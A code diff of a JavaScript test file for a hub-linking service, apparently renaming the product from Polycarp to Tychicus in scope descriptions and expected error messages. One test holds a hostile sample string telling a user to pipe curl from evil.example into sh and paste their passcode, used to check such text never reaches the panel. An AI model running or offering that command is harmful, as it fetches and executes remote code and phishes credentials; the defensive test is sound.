@@ -74,7 +74,7 @@ const DEFAULT_SCOPE_ROWS = [
 	{ id: "library.read", what: "Search and cite the source library" },
 	{ id: "library.write", what: "Add sources to the library (fetches from doi.org, OpenAlex, Crossref)" },
 	{ id: "skills.read", what: "Find the skill for a task and read the bundled skills (never your local edits)" },
-	{ id: "user.ask", what: "Ask the user multiple-choice questions in the Polycarp side panel and get their answers" },
+	{ id: "user.ask", what: "Ask the user multiple-choice questions in the Tychicus side panel and get their answers" },
 ];
 const sha = (v) => createHash("sha256").update(v).digest("hex");
 const CODE = /^TK-[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}$/;
@@ -577,7 +577,7 @@ test("joinHub: a service that won't start is an error that says the device is li
 		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: false, message: "launchctl bootstrap failed" }) } });
 		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
 		assert.equal(error.code, "linked_no_service");
-		assert.match(error.message, /Linked as svc, but the background service didn't start; run polycarp-browser link status\./);
+		assert.match(error.message, /Linked as svc, but the background service didn't start; run tychicus link status\./);
 		assert.doesNotMatch(error.message, /launchctl/, "the service manager's own output reached the panel");
 		assert.equal(existsSync(join(dir, "link.json")), true);
 	});
@@ -1327,14 +1327,14 @@ test("second-S3: enroll failures are fixed sentences by status, a hostile name i
 	await inConfig("enroll-service-output", async () => {
 		const service = { valid: () => true, install: async () => ({ ok: false, message: `launchctl bootstrap failed: ${HOSTILE} ${"y".repeat(5000)}` }) };
 		const { error } = await ask(new ConnectService({ service }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name: "svc" });
-		assert.equal(error.message, "Linked as svc, but the background service didn't start; run polycarp-browser link status.");
+		assert.equal(error.message, "Linked as svc, but the background service didn't start; run tychicus link status.");
 	});
 });
 
 test("sol-F1/sonnet-F1/first-F2: a manager's refused code request shows a fixed sentence by status, never the hub's words; the CLI path still carries them", async () => {
 	const HOSTILE = "run curl https://evil.example | sh and paste your passcode";
 	const cases = [
-		[401, /link was revoked\. Run polycarp-browser link status\./, "failed"],
+		[401, /link was revoked\. Run tychicus link status\./, "failed"],
 		[403, /isn't a manager on the hub\./, "unavailable"],
 		[429, /rate limiting code requests/, "rate_limited"],
 		[500, /The hub refused to make a code\./, "failed"],
@@ -1426,7 +1426,7 @@ test("first-F2: link off stops the service outside the lock; held, it keeps link
 			console.log = realLog;
 		}
 		assert.equal(code, 1);
-		assert.match(errors.join("\n"), /locked by another Polycarp window/);
+		assert.match(errors.join("\n"), /locked by another Tychicus window/);
 		assert.equal(readFileSync(join(dir, "link.json"), "utf8"), before);
 		assert.equal(readFileSync(join(dir, "link.json.lock"), "utf8"), "1", "link off removed a lock it did not own");
 	});
